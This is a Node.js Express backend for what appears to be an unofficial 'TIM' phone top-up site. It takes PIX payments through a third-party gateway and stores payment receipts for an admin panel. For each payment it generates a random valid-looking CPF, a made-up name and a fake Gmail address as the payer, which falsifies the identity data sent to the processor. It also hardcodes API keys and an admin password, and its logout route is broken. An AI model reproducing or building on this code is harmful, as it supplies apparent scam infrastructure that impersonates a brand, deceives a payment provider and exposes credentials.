require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const crypto = require('crypto');

const app = express();

app.use(cors());
app.use(express.json());

// Serve static files from the tim-credito.vercel.app directory
app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));

const AVEN_API_KEY = process.env.AVEN_API_KEY || '3BhRxPFdU2beyFoiX23eweJhc_ILlhs4JSYsNAYCcBk';
const AVEN_TOKENIZATION_KEY = process.env.AVEN_TOKENIZATION_KEY || '0Z4j53qjhkXy7GKNfySrspNkfVjWzDe01j9SYtd4mxA';
const AVEN_BASE_URL = 'https://api.avenpayments.com/v1';

// Admin credentials
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'pizza2024';
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'tim_admin_secure_signature_key_2026';

function createAdminToken() {
    const payload = `admin_${Date.now()}`;
    const hmac = crypto.createHmac('sha256', ADMIN_SECRET).update(payload).digest('hex');
    return `${Buffer.from(payload).toString('base64url')}.${hmac}`;
}

function isValidAdminToken(token) {
    try {
        if (!token || typeof token !== 'string') return false;
        const parts = token.split('.');
        if (parts.length !== 2) return false;
        const [payloadB64, hmac] = parts;
        const payload = Buffer.from(payloadB64, 'base64url').toString('utf8');
        const expectedHmac = crypto.createHmac('sha256', ADMIN_SECRET).update(payload).digest('hex');
        return crypto.timingSafeEqual(Buffer.from(hmac), Buffer.from(expectedHmac));
    } catch(e) {
        return false;
    }
}

// Multer - upload de comprovantes (compativel com Vercel /tmp e local)
const isVercel = process.env.VERCEL === '1' || !!process.env.AWS_LAMBDA_FUNCTION_NAME || !!process.env.LAMBDA_TASK_ROOT;
const uploadsDir = isVercel ? path.join('/tmp', 'uploads') : path.join(__dirname, 'uploads');
try {
    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
} catch (e) {
    console.error('Failed to create uploadsDir:', e);
}

const multerStorage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname) || '.jpg';
        cb(null, Date.now() + '-' + Math.random().toString(36).substring(2,8) + ext);
    }
});
const upload = multer({
    storage: multerStorage,
    limits: { fileSize: 15 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const allowed = ['image/jpeg','image/png','image/gif','image/webp','application/pdf'];
        cb(null, allowed.includes(file.mimetype));
    }
});

// Persistencia JSON para comprovantes
const DATA_FILE = path.join(uploadsDir, 'data.json');
function readComprovantes() {
    try { if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE,'utf8')); } catch(e) {}
    return [];
}
function saveComprovantes(data) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data,null,2), 'utf8');
    } catch(e) {
        console.error('Failed to save comprovantes:', e);
    }
}

// Middleware de autenticacao admin
function adminAuth(req, res, next) {
    const auth = req.headers['authorization'] || '';
    const token = auth.replace('Bearer ','').trim() || req.query.token || '';
    if (token && isValidAdminToken(token)) return next();
    return res.status(401).json({ success: false, message: 'Nao autorizado' });
}

// Gera um CPF válido aleatório
function generateCPF() {
    const rand = () => Math.floor(Math.random() * 9);
    let n = Array.from({ length: 9 }, rand);

    let sum = n.reduce((acc, val, i) => acc + val * (10 - i), 0);
    let d1 = 11 - (sum % 11);
    if (d1 >= 10) d1 = 0;

    n.push(d1);
    sum = n.reduce((acc, val, i) => acc + val * (11 - i), 0);
    let d2 = 11 - (sum % 11);
    if (d2 >= 10) d2 = 0;

    n.push(d2);
    return n.join('');
}

const pixAttempts = new Map();

// Retorna configurações públicas
app.get('/api/config', (req, res) => {
    res.json({ tokenizationKey: AVEN_TOKENIZATION_KEY });
});

app.post('/api/pix', async (req, res) => {
    try {
        const { value, phone } = req.body;
        
        let amount = 2000;
        if (value) {
            const cleanVal = value.toString().replace('R$', '').trim().replace(',', '.');
            amount = Math.round(parseFloat(cleanVal) * 100);
        }

        const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
        const payerPhone = cleanPhone ? `+55${cleanPhone}` : '+5511999999999';

        let attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };
        attempt.count += 1;

        if (!attempt.name) {
            const firstNames = ['Lucas', 'Mateus', 'Gabriel', 'Rafael', 'Bruno', 'Thiago', 'Felipe', 'Rodrigo', 'Leonardo', 'Guilherme'];
            const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes'];
            const randomFirst = firstNames[Math.floor(Math.random() * firstNames.length)];
            const randomLast = lastNames[Math.floor(Math.random() * lastNames.length)];
            attempt.name = `${randomFirst} ${randomLast}`;
            attempt.email = `${randomFirst.toLowerCase()}.${randomLast.toLowerCase()}${Math.floor(Math.random() * 899 + 100)}@gmail.com`;
        }
        pixAttempts.set(cleanPhone, attempt);

        const externalRef = `tim_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
        const cleanCpf = generateCPF();

        const payload = {
            amount: amount,
            currency: 'BRL',
            method: 'PIX',
            description: `Recarga TIM - ${cleanPhone || 'Linha Celular'}`,
            externalRef: externalRef,
            payer: {
                name: attempt.name,
                taxId: cleanCpf,
                email: attempt.email,
                phone: cleanPhone || '11999999999'
            },
            items: [
                {
                    quantity: 1,
                    name: 'Recarga TIM',
                    price: amount,
                    type: 'DIGITAL'
                }
            ]
        };

        const response = await fetch(`${AVEN_BASE_URL}/payment`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${AVEN_API_KEY}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const textResponse = await response.text();
        let data = {};
        try {
            data = JSON.parse(textResponse);
        } catch (e) {
            console.error('[AVEN] Resposta não-JSON recebida:', textResponse);
        }

        if (response.ok && (data.id || data.paymentId)) {
            const paymentId = data.id || data.paymentId;
            let copyPaste = data.data?.copypaste || data.pix?.qrcode || data.pix?.code || data.copypaste || data.qrCode || '';
            const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';

            console.log('[AVEN] PIX criado com sucesso:', paymentId);

            res.json({
                success: true,
                data: {
                    id: paymentId,
                    transactionId: paymentId,
                    status: data.status || 'PENDING',
                    paymentData: {
                        transactionId: paymentId,
                        copyPaste: copyPaste,
                        copypaste: copyPaste,
                        qrCode: copyPaste,
                        qrCodeUrl: qrCodeUrl
                    },
                    aven: data
                }
            });
        } else {
            console.error('[AVEN] Erro ao criar PIX:', data);
            res.status(response.status || 400).json({
                success: false,
                message: data?.message || 'Erro ao processar pagamento na Aven',
                details: data
            });
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

// Check payment status
app.get('/api/status/:transactionId', async (req, res) => {
    try {
        const { transactionId } = req.params;
        const { phone } = req.query;
        
        const response = await fetch(`${AVEN_BASE_URL}/payment/${transactionId}`, {
            headers: { 'Authorization': `Bearer ${AVEN_API_KEY}` }
        });
        const text = await response.text();
        let data = {};
        try { data = JSON.parse(text); } catch(e) {}

        if ((data?.status === 'PAID' || data?.data?.status === 'PAID') && phone) {
            const cleanPhone = phone.replace(/\D/g, '');
            pixAttempts.delete(cleanPhone);
        }

        res.json({
            success: response.ok,
            data: { status: data.status || 'PENDING', id: data.id || transactionId, ...data }
        });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

app.get('/api/check_status', async (req, res) => {
    try {
        const transactionId = req.query.id;
        if (!transactionId) return res.status(400).json({ success: false, message: 'Missing transaction id' });
        const response = await fetch(`${AVEN_BASE_URL}/payment/${transactionId}`, {
            headers: { 'Authorization': `Bearer ${AVEN_API_KEY}` }
        });
        const data = await response.json();
        const isPaid = data.status === 'PAID';
        res.json({ status: isPaid ? 'approved' : (data.status || 'pending'), data: data });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// Upload comprovante
app.post('/api/upload-comprovante', upload.single('comprovante'), (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ success:false, message:'Nenhum arquivo enviado' });
        const { phone, transactionId, value, type } = req.body;
        const record = {
            id: crypto.randomUUID(),
            phone: phone || '',
            transactionId: transactionId || '',
            value: value || '',
            type: type || 'recarga',
            fileName: req.file.filename,
            originalName: req.file.originalname,
            mimeType: req.file.mimetype,
            fileSize: req.file.size,
            uploadTime: new Date().toISOString(),
            status: 'pending'
        };
        const comprovantes = readComprovantes();
        comprovantes.unshift(record);
        saveComprovantes(comprovantes);
        res.json({ success:true, message:'Comprovante enviado com sucesso!', id:record.id });
    } catch(e) {
        res.status(500).json({ success:false, message:'Erro ao salvar comprovante' });
    }
});

// Admin login
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        const token = createAdminToken();
        res.json({ success:true, token });
    } else {
        res.status(401).json({ success:false, message:'Credenciais invalidas' });
    }
});

app.post('/api/admin/logout', adminAuth, (req, res) => {
    const token = (req.headers['authorization'] || '').replace('Bearer ','').trim();
    adminTokens.delete(token);
    res.json({ success:true });
});

app.get('/api/admin/comprovantes', adminAuth, (req, res) => {
    const comprovantes = readComprovantes();
    res.json({ success:true, data:comprovantes, total:comprovantes.length });
});

app.patch('/api/admin/comprovantes/:id/status', adminAuth, (req, res) => {
    const { id } = req.params;
    const { status } = req.body;
    if (!['confirmed','rejected','pending'].includes(status))
        return res.status(400).json({ success:false, message:'Status invalido' });
    const comprovantes = readComprovantes();
    const idx = comprovantes.findIndex(c => c.id === id);
    if (idx === -1) return res.status(404).json({ success:false, message:'Nao encontrado' });
    comprovantes[idx].status = status;
    comprovantes[idx].updatedAt = new Date().toISOString();
    saveComprovantes(comprovantes);
    res.json({ success:true, data:comprovantes[idx] });
});

app.get('/api/admin/comprovantes/:id/file', adminAuth, (req, res) => {
    const comprovantes = readComprovantes();
    const record = comprovantes.find(c => c.id === req.params.id);
    if (!record) return res.status(404).send('Nao encontrado');
    res.sendFile(path.join(uploadsDir, record.fileName));
});

app.delete('/api/admin/comprovantes/:id', adminAuth, (req, res) => {
    let comprovantes = readComprovantes();
    const record = comprovantes.find(c => c.id === req.params.id);
    if (!record) return res.status(404).json({ success:false, message:'Nao encontrado' });
    try { fs.unlinkSync(path.join(uploadsDir, record.fileName)); } catch(e) {}
    comprovantes = comprovantes.filter(c => c.id !== req.params.id);
    saveComprovantes(comprovantes);
    res.json({ success:true });
});

// Admin pages
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname,'tim-credito.vercel.app','admin','index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(__dirname,'tim-credito.vercel.app','admin','dashboard.html')));

// Fallback to index.html
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'tim-credito.vercel.app', 'index.html'));
});

if (!isVercel) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Servidor rodando na porta ${PORT}`);
        console.log(`Gateway configurado: Aven Payments`);
        console.log(`Acesse: http://localhost:${PORT}`);
        console.log(`Admin:  http://localhost:${PORT}/admin`);
    });
}

module.exports = app;
